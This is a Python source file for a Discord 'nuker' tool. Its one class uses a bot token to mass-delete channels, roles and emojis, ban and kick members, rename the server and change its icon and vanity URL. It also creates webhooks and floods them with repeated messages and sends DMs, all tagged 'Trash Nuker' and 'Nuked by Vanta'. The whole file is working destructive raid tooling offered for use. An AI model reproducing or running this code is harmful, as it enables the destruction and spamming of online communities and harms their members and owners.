# language: Python, file: nuking.py, target: Windows 11, Python 3.10+
import random, time, base64, os
from Plugins.tools import Tools

class Nuking:
    def __init__(self, token: str, guild_id: str) -> None:
        self.headers = {
            "Authorization": "Bot %s" % token,
            "Content-Type": "application/json",
            "X-Audit-Log-Reason": "Trash Nuker"
        }
        self.guild, self.token = guild_id, token
    
    def delete_channel(self, channel_id: str):
        try:
            url = Tools.api("/channels/%s" % channel_id)
            r = Tools.request("delete", url, headers=self.headers)
            if r.status_code in [200, 204]:
                return True
            else:
                return False
        except: return False

    def create_channel(self, name: str, channel_type: int):
        try:
            url = Tools.api("/guilds/%s/channels" % self.guild)
            payload = {"name": name, "type": channel_type}
            r = Tools.request("post", url, headers=self.headers, json=payload)
            if r.status_code in [200, 201]:
                data = r.json()
                return data["id"], data["name"]
            else:
                return False, False
        except: return False, False

    def rename_channel(self, name: str, channel: str):
        try:
            url = Tools.api(f"/channels/{channel}")
            payload = {"name": name }
            r = Tools.request("patch", url, json=payload, headers=self.headers)
            if r.status_code in [200, 201, 204]:
                return True
            else:
                return False
        except: return False

    def create_role(self, name: str):
        try:
            url = Tools.api("/guilds/%s/roles" % self.guild)
            payload = {"name": name, "hoist": True, "mentionable": True, "color": random.randint(0, 16777215)}
            r = Tools.request("post", url, headers=self.headers, json=payload)
            if r.status_code in [200, 201]:
                data = r.json()
                return data["id"], data["name"]
            else:
                return False, False
        except: return False, False

    def delete_role(self, role_id: str):
        try:
            url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
            r = Tools.request("delete", url, headers=self.headers)
            if r.status_code == 204:
                return True
            else: 
                return False
        except: return False            

    def rename_role(self, role_id: str, name: str):
        try:
            url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
            payload = {"name": name, "color": random.randint(0, 16777215)}
            r = Tools.request("patch", url, headers=self.headers, json=payload)
            if r.status_code in [200, 201, 204]:
                return True
            else: 
                return False
        except: return False

    def ban(self, member_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
            r = Tools.request("put", url, headers=self.headers)
            if r.status_code in [200, 201, 204]:
                return True
            else:
                return False
        except: return False
        
    def unban(self, member_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
            r = Tools.request("delete", url, headers=self.headers)
            if r.status_code in [200, 201, 204]:
                return True
            else:
                return False
        except: return False
        
    def kick(self, member_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/members/{member_id}")
            r = Tools.request("delete", url, headers=self.headers)
            if r.status_code in [200, 201, 204]:
                return True
            else:
                return False
        except: return False

    def create_webhook(self, channel: str):
        try:
            url = Tools.api(f"/channels/{channel}/webhooks")
            payload = {"name": "Nuked by Vanta"}
            r = Tools.request("post", url, headers=self.headers, json=payload)
            if r.status_code in [200, 201] and "url" in str(r.json()):
                return r.json()["url"]
            else:
                return False
        except: return False

    def send_webhook(self, url: str, message: str, times: int):
        try:
            icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "avatar.png")
            if not os.path.isfile(icon_path):
                icon_path = "avatar.png"
            
            avatar_url = ""
            if os.path.isfile(icon_path):
                with open(icon_path, "rb") as icon:
                    encoded = base64.b64encode(icon.read()).decode("utf-8")
                avatar_url = f"data:image/png;base64,{encoded}"
            else:
                avatar_url = "https://cdn.discordapp.com/attachments/1506365205813133322/1549742750109278278/IMG_3895.png"

            payload = {
                "username": "if i play, i play to win. blood)s",
                "content": message,
                "avatar_url": avatar_url
            }
            for i in range(times):
                Tools.request("post", url, json=payload)
        except: pass

    def send_message(self, channel: str, message: str):
        try:
            url = Tools.api(f"channels/{channel}/messages")
            payload = {"content": message}
            r = Tools.request("post", url, json=payload, headers=self.headers)
            if r.status_code in [200, 201]:
                return True
            else:
                return False
        except:
            return False

    def send_direct_message(self, user: str, message: str):
        try:
            url = Tools.api("/users/@me/channels")
            payload = {"recipient_id": user}
            r = Tools.request("post", url, json=payload, headers=self.headers)
            if r.status_code not in [200, 201]:
                return False
            id = r.json()["id"]
            return self.send_message(id, message)
        except:
            return False

    def change_nick(self, member_id: str, nick: str):
        try:
            url = Tools.api(f"/guilds/{self.guild}/members/{member_id}")
            payload = {"nick": nick}
            r = Tools.request("patch", url, json=payload, headers=self.headers)
            if r.status_code in [200, 201, 204]:
                return True
            else:
                return False
        except: return False        

    def rename_guild(self, name: str):
        try:
            url = Tools.api(f"/guilds/{self.guild}")
            payload = {"name": name}
            r = Tools.request("patch", url, headers=self.headers, json=payload)
            if r.status_code in [200, 201, 204]:
                return True
            else:
                return False
        except: return False
        
    def change_guild_icon(self):
        try:
            icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "avatar.png")
            if not os.path.isfile(icon_path):
                icon_path = "avatar.png"
            if not os.path.isfile(icon_path):
                print("avatar.png not found!")
                return False
            with open(icon_path, "rb") as icon:
                encoded = base64.b64encode(icon.read()).decode("utf-8")
            payload = {"icon": f"data:image/png;base64,{encoded}"}
            r = Tools.request("patch", Tools.api(f"/guilds/{self.guild}"), headers=self.headers, json=payload)
            return r.status_code in [200, 201, 204]
        except Exception as err:
            print(err)
            return False

    def change_vanity(self, vanity_code: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/vanity-url")
            headers = dict(self.headers)
            headers["Content-Type"] = "application/json"
            payload = {"code": vanity_code}
            r = Tools.request("patch", url, headers=headers, json=payload)
            return r.status_code in [200, 201, 204]
        except Exception:
            return False

    def remove_emoji(self, emoji_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/emojis/{emoji_id}")
            r = Tools.request("delete", url, headers=self.headers)
            if r.status_code in [200, 201, 204]:
                return True
            else:
                return False
        except: return False

    def sussy_create_channel(self):
        url = Tools.api(f"/guilds/{self.guild}")
        payload = {
            "public_updates_channel_id": "1",
            "rules_channel_id": "1"
        }
        r = Tools.request("patch", url, json=payload, headers=self.headers)
        if r.status_code in [200, 201, 204]:
            return True
        else:
            return False
